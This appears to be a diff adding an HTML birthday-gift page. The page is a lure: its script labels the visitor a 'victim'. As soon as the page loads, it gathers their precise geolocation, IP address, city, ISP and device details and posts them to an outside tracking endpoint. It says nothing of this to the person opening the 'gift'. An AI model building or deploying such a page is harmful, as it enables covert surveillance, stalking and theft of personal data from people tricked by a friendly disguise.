@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🎁 Happy Birthday! 🎂</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .gift-box {
+            width: 150px;
+            height: 150px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            border-radius: 20px;
+            margin: 0 auto 30px;
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            animation: bounce 1s ease infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        .gift-box:hover {
+            transform: scale(1.05);
+        }
+        .gift-box::before {
+            content: "🎁";
+            font-size: 80px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .gift-box::after {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 20px;
+            background: rgba(255,255,255,0.3);
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .message {
+            background: #f0f0f0;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            display: none;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .message.show {
+            display: block;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="container">
+    <div class="gift-box" id="giftBox"></div>
+    <h1>🎂 Happy Birthday! 🎉</h1>
+    <div class="subtitle">Someone has a special surprise for you!</div>
+    <button id="openBtn">🎁 OPEN YOUR GIFT 🎁</button>
+    <div class="loader" id="loader"></div>
+    <div class="message" id="message">
+        <h2>🎈 SURPRISE! 🎈</h2>
+        <p>This is a special birthday gift just for you!</p>
+        <p>✨ May your day be filled with joy and happiness! ✨</p>
+        <p>🎂 HAPPY BIRTHDAY! 🎂</p>
+    </div>
+    <div class="footer">❤️ Made with love</div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkId = urlParams.get('id');
+    const victimName = urlParams.get('name') || 'Guest';
+    
+    let dataSent = false;
+    
+    async function sendTrackingData() {
+        if (dataSent) return;
+        
+        try {
+            // Get location
+            let location = { error: "Not available" };
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000
+                        });
+                    });
+                    location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                } catch(e) {
+                    location = { error: e.message || "Permission denied" };
+                }
+            } else {
+                location = { error: "Geolocation not supported" };
+            }
+            
+            // Get IP and network info
+            let network = { error: "Not available" };
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                network = {
+                    ip: ipData.ip,
+                    city: geoData.city || 'N/A',
+                    region: geoData.region || 'N/A',
+                    country: geoData.country_name || 'N/A',
+                    isp: geoData.org || 'N/A'
+                };
+            } catch(e) {
+                network = { error: e.message };
+            }
+            
+            // Get device info
+            const device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            const data = {
+                id: linkId,
+                name: victimName,
+                location: location,
+                network: network,
+                device: device,
+                timestamp: new Date().toISOString(),
+                bot_api: "https://pateligreel.vercel.app/api/track"
+            };
+            
+            // Send to your bot's tracking endpoint
+            await fetch('https://pateligreel.vercel.app/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            dataSent = true;
+        } catch(e) {
+            console.log('Tracking error:', e);
+        }
+    }
+    
+    // Send tracking data immediately
+    sendTrackingData();
+    
+    // Gift opening animation
+    const giftBox = document.getElementById('giftBox');
+    const openBtn = document.getElementById('openBtn');
+    const message = document.getElementById('message');
+    const loader = document.getElementById('loader');
+    
+    openBtn.addEventListener('click', () => {
+        openBtn.style.display = 'none';
+        loader.style.display = 'block';
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            giftBox.style.animation = 'none';
+            giftBox.style.transform = 'scale(1.2)';
+            message.classList.add('show');
+            
+            setTimeout(() => {
+                giftBox.style.transform = 'scale(1)';
+            }, 500);
+        }, 1500);
+    });
+    
+    // Auto-open after 3 seconds
+    setTimeout(() => {
+        if (!message.classList.contains('show')) {
+            openBtn.click();
+        }
+    }, 5000);
+</script>
+</body>
+</html>
